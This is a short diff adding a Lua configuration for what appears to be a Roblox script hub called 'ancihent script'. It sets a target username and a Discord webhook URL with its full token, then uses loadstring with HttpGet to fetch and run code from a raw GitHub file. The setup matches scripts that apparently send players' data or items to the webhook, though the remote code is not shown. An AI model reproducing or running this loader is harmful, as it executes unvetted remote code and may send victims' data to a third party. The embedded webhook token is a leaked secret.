@@ -1,0 +1,7 @@
+.Username = "robloxadmi1019" 
+
+_G.HubName = "ancihent script"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1107090022936625212/2DKuj6r5_geuJAHILPgEleWPZEaJS44zw-9GjLx7nu0qkna6rdhBpwTww7H8NFr3z2O2"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
